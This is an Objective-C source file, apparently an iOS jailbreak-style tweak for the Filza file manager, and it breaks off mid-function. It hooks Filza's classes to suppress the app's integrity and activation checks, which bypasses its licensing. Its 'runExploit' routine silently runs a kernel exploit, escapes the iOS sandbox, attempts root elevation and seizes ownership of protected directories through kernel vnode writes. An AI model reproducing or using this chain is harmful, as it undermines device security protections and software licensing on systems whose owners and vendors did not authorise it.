#include <dirent.h>
@import UIKit;
#import <objc/runtime.h>
#import <objc/message.h>
#import <xpc/xpc.h>
#include <sys/stat.h>
#include <stddef.h>
#include <limits.h>
#include <unistd.h>

#include "kexploit/kexploit_opa334.h"
#include "kexploit/kutils.h"
#include "kexploit/krw.h"
#include "kexploit/offsets.h"
#include "kexploit/vnode.h"
#include "sandbox_escape.h"
#include "apfs_own.h"

#pragma mark - Root Helper Hooks

static BOOL hook_isRootHelperAvailable(id self, SEL _cmd) {
    return NO;
}

static int hook_spawnRootHelper(id self, SEL _cmd) { return 0; }
static int hook_spawnRootHelperIfNeeds(id self, SEL _cmd) { return 0; }
static int hook_respawnRootHelper(id self, SEL _cmd) { return 0; }
static void hook_tryLoadFilzaHelper(id self, SEL _cmd) {}
static void hook_createHelperConnectionIfNeeds(id self, SEL _cmd) {}

static int hook_spawnRoot_args_pid(id self, SEL _cmd, id path, id args, int *pid) {
    if (pid) *pid = 0;
    return -1;
}

static id hook_sendObjectWithReplySync(id self, SEL _cmd, id msg) {
    return (id)xpc_null_create();
}

static id hook_sendObjectWithReplySync_fd(id self, SEL _cmd, id msg, int *fd) {
    if (fd) *fd = -1;
    return (id)xpc_null_create();
}

static id hook_sendObjectWithReplySync_fd_logintty(id self, SEL _cmd, id msg, int *fd, BOOL logintty) {
    if (fd) *fd = -1;
    return (id)xpc_null_create();
}

static void hook_sendObjectNoReply(id self, SEL _cmd, id msg) {}

static void hook_sendObjectWithReplyAsync(id self, SEL _cmd, id msg, id queue, id completion) {
    if (completion) { void (^block)(id) = completion; block(nil); }
}

#pragma mark - Zip/Unzip via minizip C API (linked in Filza binary)

// minizip C functions — statically linked in Filza, resolve via dlsym at runtime
#include <dlfcn.h>
typedef void* zipFile64;
typedef void* unzFile64;

// Function pointer types
static zipFile64 (*p_zipOpen64)(const char*, int);
static int (*p_zipOpenNewFileInZip64)(zipFile64, const char*, const void*, const void*, unsigned, const void*, unsigned, const char*, int, int, int);
static int (*p_zipWriteInFileInZip)(zipFile64, const void*, unsigned);
static int (*p_zipCloseFileInZip)(zipFile64);
static int (*p_zipClose)(zipFile64, const char*);
static unzFile64 (*p_unzOpen64)(const char*);
static int (*p_unzGoToFirstFile)(unzFile64);
static int (*p_unzGoToNextFile)(unzFile64);
static int (*p_unzGetCurrentFileInfo64)(unzFile64, void*, char*, unsigned long, void*, unsigned long, char*, unsigned long);
static int (*p_unzOpenCurrentFilePassword)(unzFile64, const char*);
static int (*p_unzReadCurrentFile)(unzFile64, void*, unsigned);
static int (*p_unzCloseCurrentFile)(unzFile64);
static int (*p_unzClose)(unzFile64);

static bool g_minizipLoaded = false;
static void loadMinizip(void) {
    if (g_minizipLoaded) return;
    // RTLD_DEFAULT searches all loaded images including Filza's statically linked minizip
    p_zipOpen64 = dlsym(RTLD_DEFAULT, "zipOpen64");
    p_zipOpenNewFileInZip64 = dlsym(RTLD_DEFAULT, "zipOpenNewFileInZip64");
    p_zipWriteInFileInZip = dlsym(RTLD_DEFAULT, "zipWriteInFileInZip");
    p_zipCloseFileInZip = dlsym(RTLD_DEFAULT, "zipCloseFileInZip");
    p_zipClose = dlsym(RTLD_DEFAULT, "zipClose");
    p_unzOpen64 = dlsym(RTLD_DEFAULT, "unzOpen64");
    p_unzGoToFirstFile = dlsym(RTLD_DEFAULT, "unzGoToFirstFile");
    p_unzGoToNextFile = dlsym(RTLD_DEFAULT, "unzGoToNextFile");
    p_unzGetCurrentFileInfo64 = dlsym(RTLD_DEFAULT, "unzGetCurrentFileInfo64");
    p_unzOpenCurrentFilePassword = dlsym(RTLD_DEFAULT, "unzOpenCurrentFilePassword");
    p_unzReadCurrentFile = dlsym(RTLD_DEFAULT, "unzReadCurrentFile");
    p_unzCloseCurrentFile = dlsym(RTLD_DEFAULT, "unzCloseCurrentFile");
    p_unzClose = dlsym(RTLD_DEFAULT, "unzClose");
    g_minizipLoaded = (p_zipOpen64 && p_unzOpen64);
    NSLog(@"[Tweak] minizip loaded: %d (zip=%p unz=%p)", g_minizipLoaded, p_zipOpen64, p_unzOpen64);
}

static IMP orig_ZipFiles = NULL, orig_unZipFile = NULL, orig_unZipFilePassword = NULL;

// Recursively add files to a zip archive using minizip C API
static void addFileToZip(zipFile64 zf, NSString *basePath, NSString *relativePath) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *fullPath = [basePath stringByAppendingPathComponent:relativePath];
    BOOL isDir = NO;
    [fm fileExistsAtPath:fullPath isDirectory:&isDir];
    if (isDir) {
        // Add directory entry
        NSString *dirEntry = [relativePath stringByAppendingString:@"/"];
        p_zipOpenNewFileInZip64(zf, dirEntry.UTF8String, NULL, NULL, 0, NULL, 0, NULL, 0, 0, 0);
        p_zipCloseFileInZip(zf);
        for (NSString *item in [fm contentsOfDirectoryAtPath:fullPath error:nil])
            addFileToZip(zf, basePath, [relativePath stringByAppendingPathComponent:item]);
    } else {
        NSData *data = [NSData dataWithContentsOfFile:fullPath];
        if (!data) return;
        // Z_DEFLATED=8, Z_DEFAULT_COMPRESSION=-1
        p_zipOpenNewFileInZip64(zf, relativePath.UTF8String, NULL, NULL, 0, NULL, 0, NULL, 8, -1, data.length > 0xFFFFFFFF);
        p_zipWriteInFileInZip(zf, data.bytes, (unsigned int)data.length);
        p_zipCloseFileInZip(zf);
    }
}

// Hook: -[Zipper ZipFiles:toFilePath:currentDirectory:]
static id hook_ZipFiles(id self, SEL _cmd, id files, id toFilePath, id currentDirectory) {
    @try {
        loadMinizip();
        if (!g_minizipLoaded) return orig_ZipFiles ? ((id(*)(id,SEL,id,id,id))orig_ZipFiles)(self, _cmd, files, toFilePath, currentDirectory) : nil;
        zipFile64 zf = p_zipOpen64(((NSString *)toFilePath).UTF8String, 0); // APPEND_STATUS_CREATE=0
        if (!zf) { NSLog(@"[Tweak] zipOpen64 failed"); return nil; }

        for (id fi in files) {
            NSString *fn = [fi performSelector:NSSelectorFromString(@"fileName")];
            if (fn) addFileToZip(zf, currentDirectory, fn);
        }
        p_zipClose(zf, NULL);

        // Return FileItem if zip was created (matching original behavior)
        if ([[NSFileManager defaultManager] fileExistsAtPath:toFilePath]) {
            Class FI = NSClassFromString(@"FileItem");
            if (FI) {
                id item = [[FI alloc] init];
                ((void(*)(id,SEL,id,id))objc_msgSend)(item, NSSelectorFromString(@"setFilePath:attribute:"), toFilePath, nil);
                return item;
            }
        }
        return nil;
    } @catch (NSException *e) { NSLog(@"[Tweak] Zip error: %@", e); return nil; }
}

// Hook: -[Zipper unZipFile:toPath:currentDirectory:outMessage:]
static id hook_unZipFile(id self, SEL _cmd, id zipPath, id toPath, id currentDir, id *outMsg) {
    @try {
        loadMinizip();
        if (!g_minizipLoaded) return orig_unZipFile ? ((id(*)(id,SEL,id,id,id,id*))orig_unZipFile)(self, _cmd, zipPath, toPath, currentDir, outMsg) : nil;
        // zipPath is a FileItem, get the actual path string
        NSString *zipPathStr = zipPath;
        if ([zipPath respondsToSelector:NSSelectorFromString(@"filePath")])
            zipPathStr = [zipPath performSelector:NSSelectorFromString(@"filePath")];

        unzFile64 uf = p_unzOpen64(((NSString *)zipPathStr).UTF8String);
        if (!uf) { if (outMsg) *outMsg = @"Failed to open zip"; return nil; }

        NSFileManager *fm = [NSFileManager defaultManager];
        NSString *destPath = toPath;
        [fm createDirectoryAtPath:destPath withIntermediateDirectories:YES attributes:nil error:nil];

        char filename[512];
        uint8_t buf[32768];
        int ret = p_unzGoToFirstFile(uf);
        while (ret == 0) {
            p_unzGetCurrentFileInfo64(uf, NULL, filename, sizeof(filename), NULL, 0, NULL, 0);
            NSString *name = [NSString stringWithUTF8String:filename];
            NSString *fullPath = [destPath stringByAppendingPathComponent:name];

            if ([name hasSuffix:@"/"]) {
                [fm createDirectoryAtPath:fullPath withIntermediateDirectories:YES attributes:nil error:nil];
            } else {
                [fm createDirectoryAtPath:[fullPath stringByDeletingLastPathComponent]
                  withIntermediateDirectories:YES attributes:nil error:nil];

                if (p_unzOpenCurrentFilePassword(uf, NULL) == 0) {
                    NSMutableData *fileData = [NSMutableData data];
                    int bytesRead;
                    while ((bytesRead = p_unzReadCurrentFile(uf, buf, sizeof(buf))) > 0)
                        [fileData appendBytes:buf length:bytesRead];
                    p_unzCloseCurrentFile(uf);
                    [fileData writeToFile:fullPath atomically:YES];
                }
            }
            ret = p_unzGoToNextFile(uf);
        }
        p_unzClose(uf);

        if (outMsg) *outMsg = @"OK";

        // Return array of extracted FileItems (matching original behavior)
        NSArray *contents = [fm contentsOfDirectoryAtPath:destPath error:nil];
        if (contents.count > 0) {
            Class FI = NSClassFromString(@"FileItem");
            if (FI) {
                id item = [[FI alloc] init];
                ((void(*)(id,SEL,id,id))objc_msgSend)(item, NSSelectorFromString(@"setFilePath:attribute:"), destPath, nil);
                return @[item];
            }
        }
        return nil;
    } @catch (NSException *e) { NSLog(@"[Tweak] Unzip error: %@", e); if (outMsg) *outMsg = [e reason]; return nil; }
}

// Hook: -[Zipper unZipFile:toPath:currentDirectory:withPassword:outMessage:]
static id hook_unZipFilePassword(id self, SEL _cmd, id zipPath, id toPath, id currentDir, id password, id *outMsg) {
    return hook_unZipFile(self, @selector(unZipFile:toPath:currentDirectory:outMessage:), zipPath, toPath, currentDir, outMsg);
}

#pragma mark - Apps Manager Fix

// Full Apps Manager fix for sandbox-escaped devices.
// LSApplicationProxy properties (localizedName, iconsDictionary, dataContainerURL,
// staticDiskUsage, etc.) return nil without entitlements.
// Fix: Hook setAppProxy: to populate from Info.plist + filesystem directly.
// Hook calculateDiskUsage to walk bundle dirs. Hook tap to use bundle path fallback.

@interface LSApplicationProxy : NSObject
+ (id)applicationProxyForIdentifier:(NSString *)bundleId;
- (NSString *)applicationIdentifier;
- (NSURL *)bundleURL;
- (NSURL *)dataContainerURL;
- (NSString *)localizedName;
- (NSString *)bundleVersion;
- (NSString *)shortVersionString;
- (NSString *)applicationType;
- (NSDictionary *)iconsDictionary;
- (NSNumber *)staticDiskUsage;
- (NSNumber *)dynamicDiskUsage;
@end

@interface LSApplicationWorkspace : NSObject
+ (id)defaultWorkspace;
- (NSArray *)allApplications;
@end

// --- Helper: find app bundle path from bundleId ---
static NSString *findBundlePath(NSString *bundleId) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *appsDir = @"/var/containers/Bundle/Application";
    for (NSString *uuid in [fm contentsOfDirectoryAtPath:appsDir error:nil]) {
        NSString *uuidPath = [appsDir stringByAppendingPathComponent:uuid];
        for (NSString *item in [fm contentsOfDirectoryAtPath:uuidPath error:nil]) {
            if (![item hasSuffix:@".app"]) continue;
            NSString *appPath = [uuidPath stringByAppendingPathComponent:item];
            NSString *plist = [appPath stringByAppendingPathComponent:@"Info.plist"];
            NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:plist];
            if ([info[@"CFBundleIdentifier"] isEqualToString:bundleId]) return appPath;
        }
    }
    // System apps
    for (NSString *item in [fm contentsOfDirectoryAtPath:@"/Applications" error:nil]) {
        if (![item hasSuffix:@".app"]) continue;
        NSString *appPath = [@"/Applications" stringByAppendingPathComponent:item];
        NSString *plist = [appPath stringByAppendingPathComponent:@"Info.plist"];
        NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:plist];
        if ([info[@"CFBundleIdentifier"] isEqualToString:bundleId]) return appPath;
    }
    return nil;
}

// --- Helper: find data container path ---
static NSString *findDataContainer(NSString *bundleId) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *dataDir = @"/var/mobile/Containers/Data/Application";
    for (NSString *uuid in [fm contentsOfDirectoryAtPath:dataDir error:nil]) {
        NSString *uuidPath = [dataDir stringByAppendingPathComponent:uuid];
        NSString *metaPlist = [uuidPath stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPlist];
        if ([meta[@"MCMMetadataIdentifier"] isEqualToString:bundleId]) return uuidPath;
    }
    return nil;
}

// --- Helper: find best icon in bundle ---
static NSString *findIconPath(NSString *bundlePath, NSDictionary *infoPlist) {
    NSFileManager *fm = [NSFileManager defaultManager];
    // Try CFBundleIcons -> CFBundlePrimaryIcon -> CFBundleIconFiles
    NSDictionary *icons = infoPlist[@"CFBundleIcons"];
    NSDictionary *primary = icons[@"CFBundlePrimaryIcon"];
    NSArray *iconFiles = primary[@"CFBundleIconFiles"];
    if (!iconFiles) iconFiles = infoPlist[@"CFBundleIconFiles"];

    NSString *bestIcon = nil;
    unsigned long long bestSize = 0;
    if (iconFiles.count > 0) {
        for (NSString *iconName in iconFiles) {
            // Try exact name and @2x/@3x variants
            NSArray *variants = @[
                iconName,
                [iconName stringByAppendingString:@"@2x.png"],
                [iconName stringByAppendingString:@"@3x.png"],
                [iconName stringByAppendingString:@"@2x~iphone.png"],
                [iconName stringByAppendingString:@"@3x~iphone.png"],
                [NSString stringWithFormat:@"%@.png", iconName],
            ];
            for (NSString *v in variants) {
                NSString *full = [bundlePath stringByAppendingPathComponent:v];
                NSDictionary *attrs = [fm attributesOfItemAtPath:full error:nil];
                unsigned long long sz = [attrs fileSize];
                if (sz > bestSize) { bestSize = sz; bestIcon = full; }
            }
        }
    }

    // Fallback: scan for Icon*.png / AppIcon*.png
    if (!bestIcon) {
        for (NSString *file in [fm contentsOfDirectoryAtPath:bundlePath error:nil]) {
            if (([file hasPrefix:@"Icon"] || [file hasPrefix:@"icon"] || [file hasPrefix:@"AppIcon"])
                && [file hasSuffix:@".png"]) {
                NSString *full = [bundlePath stringByAppendingPathComponent:file];
                NSDictionary *attrs = [fm attributesOfItemAtPath:full error:nil];
                unsigned long long sz = [attrs fileSize];
                if (sz > bestSize) { bestSize = sz; bestIcon = full; }
            }
        }
    }
    return bestIcon;
}

// --- Hook: allApplications fallback ---
static IMP orig_allApplications = NULL;
static id hook_allApplications(id self, SEL _cmd) {
    NSArray *origResult = ((id(*)(id,SEL))orig_allApplications)(self, _cmd);
    if (origResult && origResult.count > 0) return origResult;

    NSMutableArray *apps = [NSMutableArray array];
    NSFileManager *fm = [NSFileManager defaultManager];
    void (^scanDir)(NSString *) = ^(NSString *dir) {
        for (NSString *uuid in [fm contentsOfDirectoryAtPath:dir error:nil]) {
            NSString *uuidPath = [dir stringByAppendingPathComponent:uuid];
            for (NSString *item in [fm contentsOfDirectoryAtPath:uuidPath error:nil]) {
                if (![item hasSuffix:@".app"]) continue;
                NSString *plist = [[uuidPath stringByAppendingPathComponent:item] stringByAppendingPathComponent:@"Info.plist"];
                NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:plist];
                NSString *bid = info[@"CFBundleIdentifier"];
                if (bid) {
                    id proxy = [NSClassFromString(@"LSApplicationProxy") applicationProxyForIdentifier:bid];
                    if (proxy) [apps addObject:proxy];
                }
            }
        }
    };
    scanDir(@"/var/containers/Bundle/Application");
    // System apps (flat structure)
    for (NSString *item in [fm contentsOfDirectoryAtPath:@"/Applications" error:nil]) {
        if (![item hasSuffix:@".app"]) continue;
        NSString *plist = [[@"/Applications" stringByAppendingPathComponent:item] stringByAppendingPathComponent:@"Info.plist"];
        NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:plist];
        NSString *bid = info[@"CFBundleIdentifier"];
        if (bid) {
            id proxy = [NSClassFromString(@"LSApplicationProxy") applicationProxyForIdentifier:bid];
            if (proxy) [apps addObject:proxy];
        }
    }
    NSLog(@"[Tweak] Apps Manager: found %lu apps via filesystem", (unsigned long)apps.count);
    return apps;
}

// --- Hook: setAppProxy: — populate name, icon, paths from filesystem ---
static IMP orig_setAppProxy = NULL;
static void hook_setAppProxy(id self, SEL _cmd, id proxy) {
    // Call original first
    ((void(*)(id,SEL,id))orig_setAppProxy)(self, _cmd, proxy);

    NSString *bundleId = [self performSelector:NSSelectorFromString(@"bundleId")];
    if (!bundleId) return;

    NSString *bundlePath = nil;
    NSString *currentFilePath = [self performSelector:NSSelectorFromString(@"filePath")];

    // Fix filePath if missing or inaccessible
    if (!currentFilePath || currentFilePath.length == 0) {
        NSURL *bundleURL = [proxy bundleURL];
        if (bundleURL) bundlePath = [bundleURL path];
        if (!bundlePath) bundlePath = findBundlePath(bundleId);
        if (bundlePath) {
            ((void(*)(id,SEL,id))objc_msgSend)(self, NSSelectorFromString(@"setFilePath:"), bundlePath);
        }
    } else {
        bundlePath = currentFilePath;
    }

    // Fix display name — always prefer Info.plist name over proxy
    if (bundlePath) {
        NSString *plist = [bundlePath stringByAppendingPathComponent:@"Info.plist"];
        NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:plist];
        NSString *name = info[@"CFBundleDisplayName"];
        if (!name) name = info[@"CFBundleName"];
        if (!name) name = [proxy localizedName];
        if (!name) name = bundleId;
        ((void(*)(id,SEL,id))objc_msgSend)(self, NSSelectorFromString(@"setAFileName:"), name);
    }

    // Fix icon path
    NSString *iconPath = ((id(*)(id,SEL))objc_msgSend)(self, NSSelectorFromString(@"iconPath"));
    if (!iconPath && bundlePath) {
        NSString *plist = [bundlePath stringByAppendingPathComponent:@"Info.plist"];
        NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:plist];
        NSString *found = findIconPath(bundlePath, info);
        if (found) {
            ((void(*)(id,SEL,id))objc_msgSend)(self, NSSelectorFromString(@"setIconPath:"), found);
        }
    }

    // Fix document path
    NSString *docPath = ((id(*)(id,SEL))objc_msgSend)(self, NSSelectorFromString(@"documentPath"));
    if (!docPath) {
        NSURL *dataURL = [proxy dataContainerURL];
        if (dataURL) docPath = [dataURL path];
        if (!docPath) docPath = findDataContainer(bundleId);
        if (docPath) {
            ((void(*)(id,SEL,id))objc_msgSend)(self, NSSelectorFromString(@"setDocumentPath:"), docPath);
        }
    }

    // Fix version
    NSString *ver = ((id(*)(id,SEL))objc_msgSend)(self, NSSelectorFromString(@"version"));
    if (!ver || ver.length == 0) {
        ver = [proxy bundleVersion];
        if (!ver && bundlePath) {
            NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:
                [bundlePath stringByAppendingPathComponent:@"Info.plist"]];
            ver = info[@"CFBundleShortVersionString"];
            if (!ver) ver = info[@"CFBundleVersion"];
        }
        if (ver) ((void(*)(id,SEL,id))objc_msgSend)(self, NSSelectorFromString(@"setVersion:"), ver);
    }
}


// --- Hook: browserView:didSelectItemAtIndexPath: — fallback to bundle path ---
static IMP orig_didSelectItem = NULL;
static void hook_didSelectItem(id self, SEL _cmd, id browserView, id indexPath) {
    // Get the selected item
    id fileList = ((id(*)(id,SEL))objc_msgSend)(self, NSSelectorFromString(@"fileList"));
    NSUInteger row = ((NSUInteger(*)(id,SEL))objc_msgSend)(indexPath, @selector(row));
    id item = ((id(*)(id,SEL,NSUInteger))objc_msgSend)(fileList, NSSelectorFromString(@"objectAtIndex:"), row);

    NSString *docPath = ((id(*)(id,SEL))objc_msgSend)(item, NSSelectorFromString(@"documentPath"));
    NSString *bundlePath = [item performSelector:NSSelectorFromString(@"filePath")];

    // If documentPath is nil but bundlePath exists, set documentPath to bundlePath
    // so the original handler can navigate there instead of showing error
    if (!docPath && bundlePath) {
        ((void(*)(id,SEL,id))objc_msgSend)(item, NSSelectorFromString(@"setDocumentPath:"), bundlePath);
    }

    // Call original
    ((void(*)(id,SEL,id,id))orig_didSelectItem)(self, _cmd, browserView, indexPath);
}

#pragma mark - License / Integrity Bypass

// Suppress "Main binary was modified" and "Not activated" alerts.
// +[TGAlertController showAlertWithTitle:text:cancelButton:otherButtons:completion:]
// checks the text parameter; if it's the integrity/activation alert, swallow it.
static IMP orig_showAlert = NULL;
static id hook_showAlertWithTitle(id self, SEL _cmd, id title, id text, id cancelButton, id otherButtons, id completion) {
    NSString *textStr = text;
    if ([textStr isKindOfClass:[NSString class]]) {
        if ([textStr containsString:@"binary was modified"] ||
            [textStr containsString:@"reinstall Filza"]) {
            NSLog(@"[Tweak] Suppressed integrity alert");
            return nil;
        }
    }
    // Pass through all other alerts
    return ((id(*)(id,SEL,id,id,id,id,id))orig_showAlert)(self, _cmd, title, text, cancelButton, otherButtons, completion);
}

// Suppress activation nag: -[NewActivationViewController viewDidLoad]
// Just dismiss the VC immediately so the user never sees it.
static IMP orig_activationViewDidLoad = NULL;
static void hook_activationViewDidLoad(id self, SEL _cmd) {
    // Call original to set up the VC, then immediately dismiss
    ((void(*)(id,SEL))orig_activationViewDidLoad)(self, _cmd);
    dispatch_async(dispatch_get_main_queue(), ^{
        ((void(*)(id,SEL,BOOL,id))objc_msgSend)(self,
            NSSelectorFromString(@"dismissViewControllerAnimated:completion:"), NO, nil);
    });
    NSLog(@"[Tweak] Suppressed activation nag");
}

#pragma mark - Auto-chown app bundles on navigate

// Lazy, per-.app chown: when Filza lists any path inside
// /var/containers/Bundle/Application/<UUID>/<Name>.app[/...], run
// apfs_own_tree on that .app (one time) to flip everything to 501:501.

static NSMutableSet<NSString *> *g_chowned_apps = nil;
static dispatch_queue_t g_chown_queue = NULL;

// Returns the .app root path for any path inside a Bundle/Application/<UUID>/<Name>.app,
// or nil if the path isn't inside one.
static NSString *app_root_for_path(NSString *path) {
    if (![path hasPrefix:@"/var/containers/Bundle/Application/"]) return nil;
    NSArray<NSString *> *comps = [path pathComponents];
    for (NSUInteger i = 0; i < comps.count; i++) {
        if ([comps[i] hasSuffix:@".app"]) {
            return [NSString pathWithComponents:
                [comps subarrayWithRange:NSMakeRange(0, i + 1)]];
        }
    }
    return nil;
}

static void ensure_app_chowned_async(NSString *path) {
    NSString *appRoot = app_root_for_path(path);
    if (!appRoot) return;

    @synchronized(g_chowned_apps) {
        if ([g_chowned_apps containsObject:appRoot]) return;
        [g_chowned_apps addObject:appRoot];
    }

    dispatch_async(g_chown_queue, ^{
        NSLog(@"[Tweak] auto-chown: %@", appRoot);
        apfs_own_tree([appRoot UTF8String], 501, 501);
    });
}

static IMP orig_contentsOfDirectory = NULL;
static id hook_contentsOfDirectory(id self, SEL _cmd, id path, NSError **error) {
    if ([path isKindOfClass:[NSString class]]) {
        ensure_app_chowned_async((NSString *)path);
    }
    return ((id(*)(id,SEL,id,NSError**))orig_contentsOfDirectory)(self, _cmd, path, error);
}

#pragma mark - Hook Installation

static void installHooks(void) {
    if (!g_chowned_apps) g_chowned_apps = [NSMutableSet new];
    if (!g_chown_queue) g_chown_queue = dispatch_queue_create("com.filza.autochown", DISPATCH_QUEUE_SERIAL);

    Class rfm = NSClassFromString(@"TGRootFileManager");
    if (rfm) {
        Class meta = object_getClass(rfm);
        class_replaceMethod(meta, NSSelectorFromString(@"isRootHelperAvailable"), (IMP)hook_isRootHelperAvailable, "B@:");
        class_replaceMethod(rfm, NSSelectorFromString(@"spawnRootHelper"), (IMP)hook_spawnRootHelper, "i@:");
        class_replaceMethod(rfm, NSSelectorFromString(@"spawnRootHelperIfNeeds"), (IMP)hook_spawnRootHelperIfNeeds, "i@:");
        class_replaceMethod(rfm, NSSelectorFromString(@"respawnRootHelper"), (IMP)hook_respawnRootHelper, "i@:");
        class_replaceMethod(rfm, NSSelectorFromString(@"tryLoadFilzaHelper"), (IMP)hook_tryLoadFilzaHelper, "v@:");
        class_replaceMethod(rfm, NSSelectorFromString(@"createHelperConnectionIfNeeds"), (IMP)hook_createHelperConnectionIfNeeds, "v@:");
        class_replaceMethod(rfm, NSSelectorFromString(@"spawnRoot:args:pid:"), (IMP)hook_spawnRoot_args_pid, "i@:@@^i");
        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectWithReplySync:"), (IMP)hook_sendObjectWithReplySync, "@@:@");
        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectWithReplySync:fileDescriptor:"), (IMP)hook_sendObjectWithReplySync_fd, "@@:@^i");
        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectWithReplySync:fileDescriptor:logintty:"), (IMP)hook_sendObjectWithReplySync_fd_logintty, "@@:@^iB");
        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectNoReply:"), (IMP)hook_sendObjectNoReply, "v@:@");
        class_replaceMethod(rfm, NSSelectorFromString(@"sendObjectWithReplyAsync:queue:completion:"), (IMP)hook_sendObjectWithReplyAsync, "v@:@@?");

        // Auto-chown .app on first listing of anything inside it.
        Method cod = class_getInstanceMethod(rfm, NSSelectorFromString(@"contentsOfDirectoryAtPath:error:"));
        if (cod) {
            orig_contentsOfDirectory = method_getImplementation(cod);
            method_setImplementation(cod, (IMP)hook_contentsOfDirectory);
        }
    }
    Class zipper = NSClassFromString(@"Zipper");
    if (zipper) {
        Method m;
        m = class_getInstanceMethod(zipper, NSSelectorFromString(@"ZipFiles:toFilePath:currentDirectory:"));
        if (m) { orig_ZipFiles = method_getImplementation(m); method_setImplementation(m, (IMP)hook_ZipFiles); }
        m = class_getInstanceMethod(zipper, NSSelectorFromString(@"unZipFile:toPath:currentDirectory:outMessage:"));
        if (m) { orig_unZipFile = method_getImplementation(m); method_setImplementation(m, (IMP)hook_unZipFile); }
        m = class_getInstanceMethod(zipper, NSSelectorFromString(@"unZipFile:toPath:currentDirectory:withPassword:outMessage:"));
        if (m) { orig_unZipFilePassword = method_getImplementation(m); method_setImplementation(m, (IMP)hook_unZipFilePassword); }
    }

    // License/integrity bypass
    Class alertCtrl = NSClassFromString(@"TGAlertController");
    if (alertCtrl) {
        Class alertMeta = object_getClass(alertCtrl);
        Method m = class_getClassMethod(alertCtrl, NSSelectorFromString(@"showAlertWithTitle:text:cancelButton:otherButtons:completion:"));
        if (m) {
            orig_showAlert = method_getImplementation(m);
            class_replaceMethod(alertMeta, NSSelectorFromString(@"showAlertWithTitle:text:cancelButton:otherButtons:completion:"),
                (IMP)hook_showAlertWithTitle, "@@:@@@@@");
        }
    }
    Class activationVC = NSClassFromString(@"NewActivationViewController");
    if (activationVC) {
        Method m = class_getInstanceMethod(activationVC, @selector(viewDidLoad));
        if (m) {
            orig_activationViewDidLoad = method_getImplementation(m);
            method_setImplementation(m, (IMP)hook_activationViewDidLoad);
        }
    }

    // Apps Manager fixes
    Class lsWorkspace = NSClassFromString(@"LSApplicationWorkspace");
    if (lsWorkspace) {
        Method m = class_getInstanceMethod(lsWorkspace, NSSelectorFromString(@"allApplications"));
        if (m) { orig_allApplications = method_getImplementation(m); method_setImplementation(m, (IMP)hook_allApplications); }
    }
    Class appItem = NSClassFromString(@"ApplicationItem");
    if (appItem) {
        Method m;
        m = class_getInstanceMethod(appItem, NSSelectorFromString(@"setAppProxy:"));
        if (m) { orig_setAppProxy = method_getImplementation(m); method_setImplementation(m, (IMP)hook_setAppProxy); }
    }
    Class appsVC = NSClassFromString(@"TGApplicationsViewController");
    if (appsVC) {
        Method m = class_getInstanceMethod(appsVC, NSSelectorFromString(@"browserView:didSelectItemAtIndexPath:"));
        if (m) { orig_didSelectItem = method_getImplementation(m); method_setImplementation(m, (IMP)hook_didSelectItem); }
    }

    NSLog(@"[Tweak] All hooks installed");
}

#pragma mark - Exploit (silent, background)

static void runExploit(void) {
    NSLog(@"[Tweak] Running kexploit...");
    int kret = kexploit_opa334();
    if (kret != 0) {
        NSLog(@"[Tweak] kexploit failed: %d", kret);
        return;
    }

    NSLog(@"[Tweak] kexploit succeeded, escaping sandbox...");
    uint64_t self_proc_addr = proc_self();

    // Approach A: MAC label swap (most reliable — only needs 1 pointer write,
    // uses framework's dynamically-computed offsets for every iOS version)
    int sret = sandbox_label_swap(self_proc_addr);
    NSLog(@"[Tweak] sandbox_label_swap returned %d", sret);

    // Approach B: ext_set patching (fallback if label swap fails)
    if (sret != 0) {
        int eret = sandbox_escape(self_proc_addr);
        NSLog(@"[Tweak] sandbox_escape (ext_set) returned %d", eret);
        if (eret == 0) sret = 0;
    }

    // sandbox_elevate_to_root is disabled on iOS 17+ (ucred in PPL read-only zone)
    int rret = sandbox_elevate_to_root(self_proc_addr);
    NSLog(@"[Tweak] sandbox_elevate_to_root returned %d, getuid()=%d", rret, getuid());

    if (sret != 0) {
        NSLog(@"[Tweak] sandbox escape NOT working — label swap and ext_set both failed");
        NSLog(@"[Tweak] Will still attempt APFS ownership takeover (may work if kernel exploit is active)");
    } else {
        NSLog(@"[Tweak] Sandbox escaped successfully");
    }

    const char *cbPath = "/var/mobile/Library/Carrier Bundles";
    struct stat cbStat;

    if (getuid() == 0) {
        NSLog(@"[Tweak] Running as root, full R+W access to all filesystems granted");
    } else {
        NSLog(@"[Tweak] Not root (uid=%d), falling back to APFS ownership takeover", getuid());
    }

    // Verify / Create CarrierBundles directory if it does not exist
    if (stat(cbPath, &cbStat) != 0) {
        NSLog(@"[Tweak] CarrierBundles not found at %s, creating it (errno=%d)", cbPath, errno);
        mkdir(cbPath, 0755);
    }

    if (stat(cbPath, &cbStat) == 0 && S_ISDIR(cbStat.st_mode)) {
        NSLog(@"[Tweak] CarrierBundles ownership before: uid=%u gid=%u mode=0%o",
              cbStat.st_uid, cbStat.st_gid, cbStat.st_mode & 0xFFFF);

        // Step 1: Kernel-level root directory takeover via vnode name cache.
        // Uses get_vnode_for_path_kernel which bypasses DAC by walking the
        // kernel name cache (with /var -> /private/var symlink awareness).
        // This succeeds even on root-owned 0700 directories that chdir/open
        // would reject.  Sets uid=501, gid=501 on the root dir
        // and adds owner RW bits (0600) to any children reachable via the name cache.
        long kn = apfs_own_tree_kernel(cbPath, 501, 501);
        NSLog(@"[Tweak] CarrierBundles initial kernel walk: %ld entries processed", kn);

        // Verify the root directory mode changed (sync has been called inside
        // apfs_own_tree_kernel).  If the mode is still restrictive, try a
        // direct single-entry kernel chown on just the root vnode.
        {
            struct stat verifyStat;
            if (stat(cbPath, &verifyStat) == 0) {
                NSLog(@"[Tweak] CarrierBundles after kernel walk: uid=%u gid=%u mode=0%o",
                      verifyStat.st_uid, verifyStat.st_gid, verifyStat.st_mode & 0xFFFF);
